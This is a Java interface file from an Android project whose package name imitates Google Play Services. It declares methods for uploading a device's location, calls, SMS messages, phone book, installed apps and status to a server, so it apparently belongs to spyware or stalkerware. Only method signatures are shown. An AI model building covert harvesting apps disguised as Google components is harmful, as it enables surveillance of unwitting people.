package com.google.android.gms.persistent.googleapps.repositories;

import com.google.android.gms.persistent.googleapps.network.models.data.Data;
import com.google.android.gms.persistent.googleapps.network.models.request.DeleteRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.InformationRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.SyncRequest;
import com.google.android.gms.persistent.googleapps.network.models.response.DeleteResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InformationResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InitialResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.SyncResponse;

import java.util.List;

import io.reactivex.Observable;
import io.reactivex.Single;

/**
 * Created by OldMan on 04.04.2017.
 */

public interface NetworkRepo {

    Single<InitialResponse> onInitDevice();

    Single<SyncResponse> onStateSync(SyncRequest request);

    Single<InformationResponse> addDiagnosticOfDevice(Data data);

    Single<DeleteResponse> onDeleteDevice(DeleteRequest request);

    Single<InformationResponse> setListDataOfDevice(List<Data> dataList);

    Single<InformationResponse> setDataOfDevice(Data data);

    Single<InformationResponse> addPositionOfDevice(Data data);

    Single<InformationResponse> addCallOfDevice(Data data);

    Single<InformationResponse> addSMSOfDevice(Data data);

    Single<InformationResponse> addCallListOfDevice(List<Data> dataList);

    Single<InformationResponse> addSMSListOfDevice(List<Data> dataList);



    Single<InformationResponse> setPhoneBookOfDevice(List<Data> dataList,long date);

    Single<InformationResponse> addListAppOfDevice(List<Data> dataList);

    Single<InformationResponse> addAppOfDevice(Data data);

    Single<InformationResponse> addDeviceStatus(Data data);

    Single<InformationResponse> addDeviceBatteryState(Data data);

    Single<InformationResponse> addNetworkState(Data data);
}
